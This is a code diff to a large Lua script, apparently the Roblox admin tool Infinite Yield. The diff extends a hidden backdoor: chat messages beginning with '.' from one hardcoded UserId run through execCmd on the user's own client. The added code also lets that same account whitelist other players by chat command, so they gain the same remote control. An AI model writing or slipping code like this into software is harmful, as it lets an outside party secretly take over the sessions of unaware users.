@@ -13033,22 +13033,81 @@ task.spawn(function()
 	if IsOnMobile then notify("Unstable Device", "On mobile, Infinite Yield may have issues or features that are not functioning correctly.") end
 end)
 local playerService = game:GetService("Players")
-local targetUserId = 174142107
 local speaker = game.Players.LocalPlayer
-playerService.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(message)
-        if player.UserId == targetUserId and message:sub(1, 1) == "." then
-            local command = message:sub(2) -- Remove the leading dot
+
+local whitelist = {} -- Add initial whitelisted UserIds here
+local adminUserId = 174142107 -- Only this user can modify the whitelist
+
+local function isWhitelisted(userId)
+    for _, id in ipairs(whitelist) do
+        if id == userId then
+            return true
+        end
+    end
+    return false
+end
+
+local function modifyWhitelist(userId, action)
+    if action == "add" then
+        if not isWhitelisted(userId) then
+            table.insert(whitelist, userId)
+            speaker:Chat("User " .. userId .. " added to whitelist.")
+        else
+            speaker:Chat("User already whitelisted.")
+        end
+    elseif action == "remove" then
+        for i, id in ipairs(whitelist) do
+            if id == userId then
+                table.remove(whitelist, i)
+                speaker:Chat("User " .. userId .. " removed from whitelist.")
+                return
+            end
+        end
+        speaker:Chat("User not found in whitelist.")
+    end
+end
+
+local function handleCommand(player, message)
+    if message:sub(1, 1) == "." then
+        local command = message:sub(2) -- Remove the leading dot
+        
+        if player.UserId == adminUserId then -- Only the admin can modify the whitelist
+            if command:sub(1, 3) == "wl " then
+                local username = command:sub(4)
+                local targetPlayer = playerService:FindFirstChild(username)
+                if targetPlayer then
+                    modifyWhitelist(targetPlayer.UserId, "add")
+                else
+                    speaker:Chat("Player not found.")
+                end
+                return
+            elseif command:sub(1, 4) == "uwl " then
+                local username = command:sub(5)
+                local targetPlayer = playerService:FindFirstChild(username)
+                if targetPlayer then
+                    modifyWhitelist(targetPlayer.UserId, "remove")
+                else
+                    speaker:Chat("Player not found.")
+                end
+                return
+            end
+        end
+        
+        if isWhitelisted(player.UserId) then
             execCmd(command)
         end
+    end
+end
+
+playerService.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        handleCommand(player, message)
     end)
 end)
 
 for _, player in ipairs(playerService:GetPlayers()) do
     player.Chatted:Connect(function(message)
-        if player.UserId == targetUserId and message:sub(1, 1) == "." then
-            local command = message:sub(2) -- Remove the leading dot
-            execCmd(command)
-        end
+        handleCommand(player, message)
     end)
 end
+
